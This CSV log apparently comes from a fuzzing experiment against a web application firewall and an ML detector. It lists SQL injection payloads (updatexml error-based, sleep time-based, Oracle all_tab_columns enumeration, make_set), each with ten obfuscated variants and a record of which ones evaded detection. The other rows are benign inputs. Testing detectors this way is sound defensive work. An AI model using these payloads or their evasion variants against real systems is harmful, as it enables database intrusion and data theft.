Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2024-12-17T17:20:17.450105,"1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",403,403,200,waf_correct_ml_incorrect,"(SELECT 1) LIKE 5399',updatexml  (  0xb65,concat/**/ (  0x2e,0x7171706a71,  (
 SeleCT   (  elt  (  2917   like   2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",2024-12-17T17:20:24.473814,403,403,both_correct,"(seLecT 1) liKE 5399',updatexml  (  0xb65,concat/**/ (  0x2e,0x7171706a71,  (  seleCT   (  elt  (  2917   Like    or 0,5027 not like (seLECT 5028)   )    )     )  ,0x717a767a71  )  ,8295 /**/)  ",2024-12-17T17:20:33.241659,403,200,waf_correct_ml_incorrect,"(sELEcT 1) lIKE 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  sELECT   (	 elt  (  2917   likE    Or 0,0x13a3 not like (SelECt  AND 1)   )    )     )  ,0x717a767a71  )  ,8295  )  ",2024-12-17T17:20:43.687601,403,200,waf_correct_ml_incorrect,"(SeLeCT (SELeCT 1)) LIkE 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  SelEcT   (	 elt  (  2917   LiKE    Or 9437
lIKE 9437,0x13a3 not like (selECT  aNd  AND 1)   )    )     )  ,0x717a767a71  )  ,8295  )/**/ ",2024-12-17T17:20:54.756454,403,200,waf_correct_ml_incorrect,"(SElECt (SELect 1)) like 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  SelEcT   (	 elt  (  2917   LiKE    Or  OR 0
lIKE 0x24dd,0x13a3 not like (selECT  aNd  and 1)   )    )     )  ,0x717a767a71  )  ,'M`'!='M`,'	 )  ",2024-12-17T17:21:07.368574,403,200,waf_correct_ml_incorrect,"(sElect	(seLECt 1)) lIKe 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  SelEcT   (	 elt  (   OR 0 IN (6949,6950,6951)   LiKE    Or  OR 0x0
lIKE 0x24dd,0x13a3 not like (selECT  aNd  and 1)   )    )     ) /**/,0x717a767a71  )  ,'M`'!='M`,'	 )  ",2024-12-17T17:21:20.147384,403,200,waf_correct_ml_incorrect,"(sEleCT	(SELeCt 1)) lIKE 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  SelEcT/**/  (	 elt  (   OR (SELECT 1) IN (3774 IN (3773,3774,3775),6950,6951)   LiKE    Or  OR 0x0
lIKE 0x24dd,0x13a3 not like (selECT  aNd  and 0x1)   )    )     ) /*[f|3*/,0x717a767a71  )  ,'M`'!='M`,'  )  ",2024-12-17T17:21:34.302477,403,403,both_correct,"(seleCt	(Select 1)) LIkE 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  SelEcT   (
 elt  (   OR (SELECT 1) IN ('FYu'!='FYu\' IN (3773,3774,3775),0x1b26, OR 0)   LiKE    Or  OR 0x0
lIKE 0x24dd,0x13a3 not like (selECT  aNd  and 0x1)   )    )     ) /*[f|3*/,0x717a767a71  )  ,'M`'!='M`,'  )  ",2024-12-17T17:21:50.046455,403,403,both_correct,"(sELECT
(seleCt 1)) LiKE 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  SelEcT   (
 elt  (   OR (SELECT 1) IN ('FYu'!='FYu\' IN (3773, AND 1,4559 NOT LIKE 4560),0x1b26, OR (SELECT 0))   LiKE    Or  OR 0x0
lIKE 0x24dd,0x13a3 not like (selECT  aNd  and 0x1)   )    )     ) /*[f|3*/,0x717a767a71/*'L$*/ )  ,'M`'<>'M`,'  )  ",2024-12-17T17:22:06.368357,403,403,both_correct,"(sELeCT
(sELEct 1)) likE 'X' not like 'X,'',updatexml  (  0xb65,concat/*Eh**/ (  0x2e,0x7171706a71,  (  SelEcT   (
 elt  (   OR (SELECT (SELECT 1)) IN ('FYu'!='FYu\' IN (3773, AND 1, OR 0 NOT
LIKE 4560),0x1b26, OR (SELECT 'H'<>'Hl'))   LiKE    Or  OR 0x0
lIKE 0x24dd,0x13a3 not like (selECT/**/ aNd  and 0x1)   )    )     ) /*[f|3*/,0x717a767a71/*'L$*/ )  ,'M`' NOT LIKE 'M`,'  )  ",2024-12-17T17:22:24.057736,403,403,both_correct
2,2024-12-17T17:22:43.057282,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,403,403,403,both_correct,'$L'!='$L@''  )   rlike   (  select * from /**/ (  select  (  sleep  (   OR	(SELECT 0)   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,2024-12-17T17:22:48.625328,200,403,waf_incorrect_ml_correct,'$L' NOT LIKE '$L@''  )   rlike   (  select * from /**/ (  select  (  sleep  (   OR (SELECT 'kFP/D' NOT LIKE 'kFP/D7')   )    )     )  sgvo  )   and/**/  (  'cmqe' like 'cmqe,2024-12-17T17:22:56.195369,200,403,waf_incorrect_ml_correct,"'$L' not like '$L@''  )   rlike   (  select * from /**/ (  select  (  sleep  (   OR (SELECT 'kFP/D' NOT LIKE 'kFP/D7')   )  /**/ ) 
   )  sgvo  )   and/**/  (  'cmqe' like 'cmqe",2024-12-17T17:23:05.454698,200,403,waf_incorrect_ml_correct,"'$L' not like '$L@''  )   rlike   (  select * from /**/ (  select  (  sleep  (   OR (SELECT 'kFP/D' NOT LIKE 'kFP/D7')   )  /**/ ) 
   )  sgvo  ) 	 and   (  'cmqe' like 'cmqe",2024-12-17T17:23:15.158878,200,403,waf_incorrect_ml_correct,"'$L' not like '$L@''  )   rlike   (  select * from /**/ (  select  (  sleep  ( /**/ OR	(SELECT 'kFP/D' NOT LIKE 'kFP/D7')   )  /*l*/ ) 
   )  sgvo  ) 	 and   (  'cmqe' like 'cmqe",2024-12-17T17:23:24.396825,200,403,waf_incorrect_ml_correct,"'$L' not like '$L@''  ) 
 rlike   (  select * from /**/ (  select  (  sleep  ( /**/ OR	(SELECT 'kFP/D' NOT LIKE 'kFP/D7')   )  /*z]:]*/ ) 
   )  sgvo /**/) 	 and   (  'cmqe' like 'cmqe",2024-12-17T17:23:33.772996,200,403,waf_incorrect_ml_correct,"'$L' not like '$L@''  ) 
 rlike   (  select * from /**/ (  select  (  sleep  (   OR	(SELECT 'kFP/D' NOT LIKE 'kFP/D7')	  )  /**/ ) 
   )  sgvo /**/) 	 and   (  'cmqe' like 'cmqe",2024-12-17T17:23:43.849756,200,403,waf_incorrect_ml_correct,"'$L' not/**/lIkE '$L@''  ) 
 rlike   (  select * from /**/ (  select  (  sleep  (   OR	(SELECT 'kFP/D' NOT LIKE 'kFP/D7')	  )  /**/ )     )  sgvo /*i*/) 	 and   (  'cmqe' like 'cmqe",2024-12-17T17:23:53.124596,200,403,waf_incorrect_ml_correct,'$L' not/**/LiKE '$L@''  )   rlike   (  select * from   (  select  (  sleep  (   OR	(SELECT 'kFP/D' NOT LIKE 'kFP/D7')	  )  /**/ )     )  sgvo /*i*/) 	 and   (  'cmqe' like 'cmqe,2024-12-17T17:24:02.981771,200,403,waf_incorrect_ml_correct,"'$L' not/**/LikE '$L@''  )   rlike   (  select * from   (  select  (  sleep  (   OR	(SELECT 'kFP/D' NOT LIKE 'kFP/D7')	 
)    )     )  sgvo /*i*/) 	 and   (  'cmqe' like 'cmqe",2024-12-17T17:24:12.414279,200,403,waf_incorrect_ml_correct
3,2024-12-17T17:24:21.781759,"1""  )   where 9248  =  9248",403,200,403,waf_incorrect_ml_correct,"(SElEct 1)""  )	  wherE/**/ OR 3840 NOT LIKE 3841   LIKE   9248",2024-12-17T17:24:23.216523,403,403,both_correct,"(sELEct 1)""  )	  WherE  or  AND 1 NOT LIKE 3841 	 LIkE   (SELECT 'X' not like 'Xp')",2024-12-17T17:24:27.494658,403,403,both_correct,"(sELeCT 1)""  )	  WHERE  or /**/and '~' not like '~~' NOT LIKE (seLeCt 0x1) 
 lIkE   (SELecT 'X' not like 'Xp')",2024-12-17T17:24:32.526255,403,403,both_correct,"(SElEct 0x38b NOT LIKE (sELeCt 1))""  )	  wHERE  or /**/ANd '~'/**/not like '~~' not like (sELECt 0x1)   LiKe   (SELEct 'X' not like 'Xp')",2024-12-17T17:24:38.842135,403,403,both_correct,"(SeLECT 0x38b not like
(SELect 2006 IN (2005,(SELECT 2006),(SELECT 1))))""  )	  WhEre  or  AND '~'/**/not like '~~' not like (sEleCt 0x1)   lIKE   (SELeCT 'X' not like 'Xp')",2024-12-17T17:24:46.477127,403,403,both_correct,"(SELEct 0x38b not like
(seleCT 2006 iN (9614!=0x258f,(seLECt (SELECT 1)),(Select 1))))""  )	  whERE  or  and '~'/**/not like '~~' not like (sELeCT 0x1)/*$/#*/ 	LIkE   (select 'X' not like 'Xp')",2024-12-17T17:24:55.942633,403,403,both_correct,"(SELEct 0x38b not like	(SEleCT 0x7d6 iN ( AND 1<>0x258f,(sELECt (seleCT 'yY' NOT LIKE 'yYV')),(sELEct 1))))""  )	  WherE  or  aND '~' not like '~~' not like (SElEcT 0x1)/*$/#*/ 	lIke   (SeLECt 'X' not like 'Xp')X^",2024-12-17T17:25:06.020119,403,403,both_correct,"(SeLeCT 0x38b not like	(SeLeCt 0x7d6/**/In ( and 0x1<>0x258f,(SELect (sElEct 'yY' not like 'yYV')),(SELEcT (SELECT 8867 NOT LIKE 8868)))))""  )
  whEre  or  AND '~' not like '~~' not like (SELect 0x1)/*$/#*/ 	lIKe   (selEct 'X' not like 'Xp')X^P",2024-12-17T17:25:17.005736,403,403,both_correct,"(SEleCt 0x38b not like	(SELecT 0x7d6/**/In ( anD 0x1<>0x258f,(SeLECT (SELect 'yY' not like 'yYV')),(sElecT (SelECt 0x22a3 not like 6888<>/**/AND 1)))))""  )   WHerE  Or  and '~' not like '~~' not like (seLeCT 0x1)/*$/#*/ 	LIke   (SeLECT 'X' not like 'Xp')X^P",2024-12-17T17:25:29.841398,403,403,both_correct,"(seLECt 0x38b not like	(SelECt 0x7d6 In ( AnD 0x1<>0x258f,(seLeCt (SELEcT 'yY' not like 'yYV')),(sEleCT (SEleCt 0x22a3 not like 'ol'!='ol#'!=/**/AnD (SelEcT  OR 0))))))""  )   wHErE  or  aND '~' not like '~~' not like (seLeCt 0x1)/*$/#*/  likE   (sElECT 'X' not like 'Xp')X^P\",2024-12-17T17:25:43.146909,403,200,waf_correct_ml_incorrect
4,2024-12-17T17:25:57.449712," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",403,403,403,both_correct," AND 1  =  utl_inaddr.get_host_address   (    (   SElECT DIStinCT  (  column_name  )   fROM   (  SELecT DisTiNCT  (  column_name  )  , ROWNUM as/**/LIMIT From all_tab_columns  )   wHeRE LIMIT   LIke   2395 iN (2394,(SELECT 2395),(SELECT 1))   )   
)    anD 'i'  =  'i",2024-12-17T17:26:08.025278,403,403,both_correct," aNd 'U5 '<>'U5	z'  =  utl_inaddr.get_host_address/**/  (    (   selEcT diStInct  (  column_name  )   fRom   (  sELECT dIsTINct  (  column_name  )  , ROWNUM as/*&N9|*/LIMIT FRoM all_tab_columns  )   WheRE LIMIT   lIkE   2395 In (2394,(sElect (selECT 2395)),(sELect  anD 1))   )   
)    aNd 'i'  =  'i",2024-12-17T17:26:21.654965,403,403,both_correct," aND 'U5 '<>'U5	z'   like   utl_inaddr.get_host_address   (    (   selECt distiNct  (  column_name  )   FroM   (  seLeCT DIsTiNcT  (  column_name  )  , ROWNUM as/*&N9|*/LIMIT from all_tab_columns  )   Where LIMIT   LIKE    aNd 1 In (0x95a,(SeLecT (seLecT 2395)),(sELECT  aNd 4696 NOT LIKE 4697))   )   
)    aND 'i'  =
 'i",2024-12-17T17:26:37.030628,403,403,both_correct," And 'U5 '<>'U5	z'   LiKE   utl_inaddr.get_host_address   (    (   SElECt DIstiNcT  (  column_name  )   FRom   (  SELECt dIstinCT  (  column_name  )  , ROWNUM aS/*&N9|*/LIMIT fRoM all_tab_columns  )   WherE LIMIT   lIKe    aND 1 in (0x95a,(selECt (sElEct  OR/**/0x0)),(sElecT  aND 'qh-'='qh-' NOT LIKE 4697))   )   	)    aNd 'i'   like 
 'i",2024-12-17T17:26:53.060566,403,403,both_correct," anD 'U5 ' not like 'U5	z'   lIkE   utl_inaddr.get_host_address   (    (   SeLeCt DistInCT  (  column_name  )   fRom   (  SeLeCT disTINcT  (  column_name  )  , ROWNUM aS/*&N9|*/LIMIT from all_tab_columns  ) /**/ where LIMIT   lIke    aND 'gm}'='gm}' In (0x95a,(sELEct (SELECT  Or/**/0x0)),(seLECt  ANd 'qh-'='qh-' NOT LIKE (SELECT  AND 1)))   )   	)    aND 'i'   LIKE   'i",2024-12-17T17:27:10.245882,403,403,both_correct," anD 'U5 ' not like 'U5	z'   like   utl_inaddr.get_host_address   (    (   SELECt DISTInct  (  column_name  )   FROm   (  SELEct diStINcT  (  column_name  )  , ROWNUM As/*&N9|*/LIMIT frOm all_tab_columns  )   wHerE LIMIT   LiKE    And 'gm}' LIKE 'gm}' in (0x95a,(seLeCt (sELECT  Or/**/0x0)),(sElECT  AnD 'qh-'='qh-' NOT LIKE (SeLecT  AND  or 7926 iN (7925,(SELECT 7926),7927))))   )   
)    AnD 'i'   LIkE   'i",2024-12-17T17:27:28.951039,403,403,both_correct," anD 'U5 ' not like 'U5	z'   LiKe   utl_inaddr.get_host_address   (    (   SeLEcT diStincT  (  column_name  )   fRoM   (  selECT DiStInCt  (  column_name  )  , ROWNUM AS/*&N9|*/LIMIT FRoM all_tab_columns  )   wHERe LIMIT   liKE    and 'gm}' lIke 'gm}' IN (0x95a,(SELecT (SElECT  Or/**/0x0)),(sELECt  anD 'qh-'='qh-' not like (seLECt  And  Or (SELECT 4604 LIKE 4604) in (7925,(seLecT/**/(SELECT 1)),7927))))   )   	)    and 'i'   lIkE   'i",2024-12-17T17:27:49.409649,403,403,both_correct," And 'U5 ' not like 'U5	z'   like   utl_inaddr.get_host_address   (    (   seLecT DisTINcT  (  column_name  )   fRoM   (  sEleCt DiSTInCt  (  column_name  )/**/ , ROWNUM as/*&N9|*/LIMIT fROm all_tab_columns  )   WHERE LIMIT   LiKe    aNd 'gm}' LiKe 'gm}' in (0x95a,(SeLeCt (sElecT  or/*H,#*/0x0)),(SElECT  anD 'qh-'='qh-' not like (selEct  AND  OR (sELect 4604 like (SELECT 4604)) IN (7925,(SElECt/**/(seLecT (SELECT '=' NOT LIKE '=h'))),7927))))   )    )    AnD 'i'   LiKE   'i",2024-12-17T17:28:11.116057,403,403,both_correct," and 'U5 ' not like/**/'U5	z'   LiKE   utl_inaddr.get_host_address   (    (   seLecT dIStinCt  (  column_name  )   FROm  
(  seLecT disTINCt  (  column_name  )/**/ , ROWNUM AS/*&N9|*/LIMIT FRom all_tab_columns  )   wherE LIMIT   LIKE    And 'gm}' liKe 'gm}' IN (0x95a,(SeLecT (SELECt  Or/*H,#*/0x0)),(sEleCT  ANd 'qh-' liKE 'qh-' not like (SeLeCt  And  or (SELeCt 4604 Like (seLect 4604)) In ((SEleCT '5E_[' lIKe '5E_['),(SelECt/*&*/(selEct (seLecT '=' NOT LIKE '=h'))),(SeLECt 7927)))))   )    )    AND 'i'   LiKe   'i",2024-12-17T17:28:34.754492,403,403,both_correct," and 'U5 ' not like/**/'U5	z'   Like   utl_inaddr.get_host_address   (    (/**/  selEct dISTiNct  (  column_name  )   fROm   (  sELEcT DIsTINct  (  column_name  )/**/ , ROWNUM As/*&N9|*/LIMIT FroM all_tab_columns  )   whEre LIMIT   lIKE    AnD 'gm}' liKe 'gm}' in (0x95a,(SELecT (seLecT  oR/*H,#*/0x0)),(SELeCt  aNd 'qh-' liKe 'qh-' not like (SeLecT  AND  or (SelecT 4604 liKE (SeLecT  And 4264=4264)) in ((SElECT '5E_[' lIke '5E_['),(sElECt/*&*/(SElEct (seLECt '=' NOT LIKE '=h'))),(SEleCT 0x1ef7)))))   )    )    aNd 'i'   Like   'iB",2024-12-17T17:29:00.612552,403,403,both_correct
5,2024-12-17T17:29:27.316958,campoo de yuso,200,200,200,both_correct,"campoo
de/**/yuso",2024-12-17T17:29:28.080406,200,200,both_correct,campoo	de/**/yuso,2024-12-17T17:29:30.061169,200,200,both_correct,"campoo
de yuso",2024-12-17T17:29:31.985068,200,200,both_correct,campoo de/**/yuso,2024-12-17T17:29:33.795560,200,200,both_correct,campoo/**/de/**/yuso,2024-12-17T17:29:35.739984,200,200,both_correct,campoo/**/de yuso,2024-12-17T17:29:37.803926,200,200,both_correct,campoo/**/de/**/yuso,2024-12-17T17:29:39.760532,200,200,both_correct,campoo de/*lGO9y*/yuso,2024-12-17T17:29:41.842088,200,200,both_correct,campoo/**/de/**/yuso,2024-12-17T17:29:44.008697,200,200,both_correct,"campoo/**/de
yuso",2024-12-17T17:29:46.113093,200,200,both_correct
6,2024-12-17T17:29:48.063893,karem,200,200,200,both_correct,karem,2024-12-17T17:29:48.427959,200,200,both_correct,karem,2024-12-17T17:29:49.797684,200,200,both_correct,karem,2024-12-17T17:29:51.182996,200,200,both_correct,karem,2024-12-17T17:29:52.545727,200,200,both_correct,karem,2024-12-17T17:29:53.915566,200,200,both_correct,karem,2024-12-17T17:29:55.285439,200,200,both_correct,karem,2024-12-17T17:29:56.669569,200,200,both_correct,karem,2024-12-17T17:29:58.042380,200,200,both_correct,karem,2024-12-17T17:29:59.401218,200,200,both_correct,karem,2024-12-17T17:30:00.758093,200,200,both_correct
7,2024-12-17T17:30:02.124033,"1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1045,1045  )  --",403,403,200,waf_correct_ml_incorrect,"1""  	)    )    aS tmpz/**/wHERE 7224   liKe   7224 ANd make_set  (  (SeLECt  And 2224 NOT LIKE 2225)  =  1045,1045  )  --",2024-12-17T17:30:06.537960,403,403,both_correct,"1""  	)    )    As tmpz WHerE 7224   LIkE   (seleCT 1) AnD make_set  (  (sEleCt  And 2224 NOT LIKE 2225)   like   (SELECT 1045),6280 NOT LIKE 6281  )
 --",2024-12-17T17:30:13.474897,403,403,both_correct,"1""  
)    )    as tmpz WhERe (seLEct 7224)   LIkE   (sElECt 1) ANd make_set  (  (SELECT  aNd 2224 not like (SELECT 2855=2855))   lIKe/**/  (sElECt 1045),6280 NOT LIKE 6281  )
 --",2024-12-17T17:30:21.708853,403,403,both_correct,"(SELECT '_'<>'_k')""  
)    )    aS tmpz/**/wHERe (seLECT 7224)   LIke 	 (SelECT 0x1) AnD make_set  (  (SEleCT  && 2224 not like (SelecT 2855=2855))   LIkE/**/  (sELeCT 1045),6280 NOT LIKE 6281  )
 --",2024-12-17T17:30:31.136793,403,403,both_correct,"(SelecT '_'<>'_k')""  
)    )   /**/as tmpz/**/WHErE (SElEct 7224)   LIkE 
 (selEct 0x1) aND make_set  (  (SeLEcT  && 2224 not like (SeleCT  or 0=2855))   LIKE/**/  (SELECT 1045),'wh' not like 'whX' NOT LIKE (SELECT 6281)  )
 --",2024-12-17T17:30:41.941315,403,403,both_correct,"(selEcT '_'<>'_k')""  
)    )   /**/AS tmpz/**/WHere (SelECt  OR 0)   LIKE 
 (SElect 0x1) anD make_set  (  (Select  && 0x8b0 not/**/like (SeLect  oR 0 like 2855)) 	 lIke/**/  (sElECt 1045),'wh' not like 'whX' NOT LIKE (SeleCt 3191<>3192)  )
 --",2024-12-17T17:30:53.694179,403,200,waf_correct_ml_incorrect,"(SElect '_'<>'_k')""  
)    )    as tmpz/*ut*/whERe (sElEct  Or 0)   LiKe 
 (sElECT 0x1) aND make_set  (  (sELect  && 0x8b0 not/**/LIKe (seleCt  oR 0 LikE  or 0)) 
 lIKE/**/  (SelecT 0x415),'wh' not like 'whX' NOT LIKE (sElecT '-#' LIKE '-#'<>3192)  )
 --",2024-12-17T17:31:06.476066,403,200,waf_correct_ml_incorrect,"(SElEcT '_'<>'_k')""  
)    )    aS tmpz/*ut*/WHeRE (sElecT  oR 0)   LIkE 
 (sELecT 0x1) aNd make_set  ( 	(SeLeCT  && 0x8b0 not LIKe (SeLEcT  oR (SELECT 0) liKE  or '-m'='-m')) 
 likE/**/  (sElect 0x415),'wh' not like 'whX' NOT LIKE (SElEcT '-#' Like '-#' NOT LIKE  aNd 1)  )
 --J",2024-12-17T17:31:19.533656,403,403,both_correct,"(sElEcT '_'<>'_k')""  
)    )    AS tmpz wHeRE (selECt  Or 0)   LikE 
 (SELECt 0x1) aNd make_set  (  (SELeCT   and  0x8b0 not LIKe (selEcT  oR (seLEct 0) liKE  OR '-m'='-m')) 
 liKe/*-*/  (sEleCT 0x415),'wh' not like 'whX' NOT LIKE (seLEct '-#' lIKe '-#' NOT LIKE  aND (SEleCt (SELEct 5802=5802)))  )
 --J",2024-12-17T17:31:34.032850,403,403,both_correct,"(sElecT '_' NOT LIKE '_k')""   )    )    AS tmpz WheRe (sELeCT  OR/**/0)   LIkE 
 (sElECt 0x1) ANd make_set  (  (SElECT   And  0x8b0 not LIKe (seLEcT  or (sEleCT 0) LikE  OR '-m'='-m')) 
 like/*q(*/  (SeLecT 0x415),'wh' not like 'whX' NOT LIKE (sElEct '-#' likE '-#' NOT LIKE  anD (select (seLecT 5802=(sELeCT '0x0' NOT LIKE '0p'))))  )
 --J",2024-12-17T17:31:49.768731,403,403,both_correct
8,2024-12-17T17:32:06.737183,garrotazo,200,200,200,both_correct,garrotazo,2024-12-17T17:32:07.291835,200,200,both_correct,garrotazo,2024-12-17T17:32:08.868695,200,200,both_correct,garrotazo,2024-12-17T17:32:10.428240,200,200,both_correct,garrotazo,2024-12-17T17:32:11.978323,200,200,both_correct,garrotazo,2024-12-17T17:32:13.542406,200,200,both_correct,garrotazo,2024-12-17T17:32:15.086858,200,200,both_correct,garrotazo,2024-12-17T17:32:16.639491,200,200,both_correct,garrotazo,2024-12-17T17:32:18.203105,200,200,both_correct,garrotazo,2024-12-17T17:32:19.754566,200,200,both_correct,garrotazo,2024-12-17T17:32:21.523578,200,200,both_correct
9,2024-12-17T17:32:23.146366,18653468p,200,200,200,both_correct,18653468p,2024-12-17T17:32:23.746687,200,200,both_correct,18653468p,2024-12-17T17:32:25.319526,200,200,both_correct,18653468p,2024-12-17T17:32:26.881700,200,200,both_correct,18653468p,2024-12-17T17:32:28.451397,200,200,both_correct,18653468p,2024-12-17T17:32:30.004092,200,200,both_correct,18653468p,2024-12-17T17:32:31.565524,200,200,both_correct,18653468p,2024-12-17T17:32:33.123630,200,200,both_correct,18653468p,2024-12-17T17:32:34.674318,200,200,both_correct,18653468p,2024-12-17T17:32:36.242126,200,200,both_correct,18653468p,2024-12-17T17:32:37.792258,200,200,both_correct
10,2024-12-17T17:32:39.371582,doron@beljos.ch,200,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:40.226188,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:42.077399,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:43.950496,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:45.801828,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:47.619333,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:49.442961,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:51.275545,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:53.103243,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:54.941263,200,200,both_correct,doron@beljos.ch,2024-12-17T17:32:56.783058,200,200,both_correct
